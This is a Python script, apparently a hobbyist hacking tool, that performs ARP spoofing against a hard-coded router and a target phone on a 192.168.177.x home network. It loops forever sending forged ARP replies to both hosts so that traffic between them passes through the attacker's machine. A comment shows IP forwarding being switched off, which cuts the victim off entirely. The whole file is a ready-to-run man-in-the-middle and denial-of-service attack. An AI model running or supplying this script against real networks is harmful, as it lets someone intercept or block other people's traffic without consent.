import scapy.all as scapy
import getmac
import time




#sudo sysctl -w net.ipv4.ip_forward=0


def spoof(target_ip, spoof_ip):
    targetmac = getmac.get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=targetmac,psrc=spoof_ip)
    scapy.send(packet)

#Samsung S6...:f7
router_ip="192.168.177.1"
router_mac=getmac.get_mac(router_ip)
target_ip="192.168.177.26"
target_mac=getmac.get_mac(target_ip)
own_ip="192.168.177.56"
packet1 = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
packet2 = scapy.ARP(op=2,pdst=router_ip,hwdst=router_mac,psrc=target_ip)
count=0
try:
    while True:
        scapy.send(packet1,verbose=False)
        scapy.send(packet2,verbose=False)
        count+=2
        print("\rSent packets: "+str(count),end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("Keyboard Interrunpt Detected ...quitting")